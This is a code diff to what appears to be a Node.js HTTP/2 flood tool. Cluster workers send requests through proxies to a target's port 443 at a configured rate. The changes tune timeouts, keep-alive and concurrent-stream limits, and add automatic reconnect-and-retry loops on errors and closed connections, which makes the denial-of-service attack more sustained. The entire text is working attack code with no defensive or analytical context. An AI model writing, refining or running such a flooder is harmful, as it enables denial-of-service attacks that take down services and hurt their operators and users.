@@ -130,7 +130,7 @@ if (cluster.isMaster) {
     console.log('\x1b[1m\x1b[31m' + 'Requests per second: ' + '\x1b[0m' + '\x1b[1m' + args.Rate + '\x1b[0m');
     setTimeout(() => process.exit(1), args.time * 1000);
 } else {
-    setInterval(runFlooder);
+    setInterval(runFlooder, 100);
 }
 
 class NetSocket {
@@ -146,8 +146,8 @@ class NetSocket {
             noDelay: true
         });
 
-        connection.setTimeout(options.timeout * 100000);
-        connection.setKeepAlive(true, 100000);
+        connection.setTimeout(options.timeout * 1000);
+        connection.setKeepAlive(true, 60000);
 
         connection.on("connect", () => {
             connection.write(buffer);
@@ -201,14 +201,16 @@ function runFlooder() {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
-        timeout: 15
+        timeout: 10
     };
 
     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) {
-            connection.close();
-            connection.destroy();
-            return;
+            if (connection) {
+                connection.close();
+                connection.destroy();
+            }
+            return setTimeout(() => runFlooder(), 100);
         }
 
         const tlsOptions = (() => {
@@ -250,7 +252,7 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 100000,
+                maxConcurrentStreams: 10000,
                 initialWindowSize: 6291456,
                 maxHeaderListSize: 65536,
                 enablePush: false
@@ -269,16 +271,29 @@ function runFlooder() {
                     request.on("response", response => {
                         request.close();
                         request.destroy();
-                        return;
+                    });
+                    request.on("error", () => {
+                        request.close();
+                        request.destroy();
                     });
                     request.end();
                 }
-            }, 500);
+            }, 100);
+            setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
+        });
+
+        client.on("error", () => {
+            client.destroy();
+            tlsConn.destroy();
+            connection.destroy();
+            setTimeout(() => runFlooder(), 100);
         });
 
         client.on("close", () => {
             client.destroy();
-            return;
+            tlsConn.destroy();
+            connection.destroy();
+            setTimeout(() => runFlooder(), 100);
         });
     });
 }
